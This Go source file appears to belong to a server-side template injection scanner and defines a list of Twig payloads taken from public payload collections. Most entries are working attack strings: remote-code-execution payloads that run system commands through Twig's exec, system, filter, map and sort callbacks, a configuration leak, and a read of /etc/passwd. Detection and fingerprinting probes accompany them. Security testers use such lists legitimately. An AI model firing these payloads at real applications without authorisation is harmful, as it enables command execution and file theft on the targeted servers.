package ssti

// Twig payloads (PHP).
// Source: PayloadsAllTheThings, HackTricks
var twigPayloads = []Payload{
	// Detection payloads
	{
		Value:           "{{7*7}}",
		Engine:          EngineTwig,
		Type:            TypeDetection,
		Description:     "Basic Twig math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{{7*'7'}}",
		Engine:          EngineTwig,
		Type:            TypeFingerprint,
		Description:     "Twig fingerprint - returns 49",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	// Environment access
	{
		Value:           "{{_self}}",
		Engine:          EngineTwig,
		Type:            TypeFingerprint,
		Description:     "Twig self object access",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Template",
	},
	{
		Value:           "{{_self.env}}",
		Engine:          EngineTwig,
		Type:            TypeFingerprint,
		Description:     "Twig environment access",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Environment",
	},
	{
		Value:           "{{_self.env.getLoader()}}",
		Engine:          EngineTwig,
		Type:            TypeConfigLeak,
		Description:     "Twig loader information",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Loader",
	},
	// RCE payloads (Twig < 2.x)
	{
		Value:           "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
		Engine:          EngineTwig,
		Type:            TypeRCE,
		Description:     "Twig RCE via filter callback",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}",
		Engine:          EngineTwig,
		Type:            TypeRCE,
		Description:     "Twig RCE via system callback",
		DetectionMethod: MethodOutput,
	},
	// Twig 3.x RCE
	{
		Value:           "{{['id']|filter('system')}}",
		Engine:          EngineTwig,
		Type:            TypeRCE,
		Description:     "Twig 3.x RCE via filter",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{['id']|map('system')}}",
		Engine:          EngineTwig,
		Type:            TypeRCE,
		Description:     "Twig 3.x RCE via map",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{['id',0]|sort('system')}}",
		Engine:          EngineTwig,
		Type:            TypeRCE,
		Description:     "Twig 3.x RCE via sort",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// File read
	{
		Value:           "{{'/etc/passwd'|file_excerpt(1,30)}}",
		Engine:          EngineTwig,
		Type:            TypeFileRead,
		Description:     "Twig file read",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
}
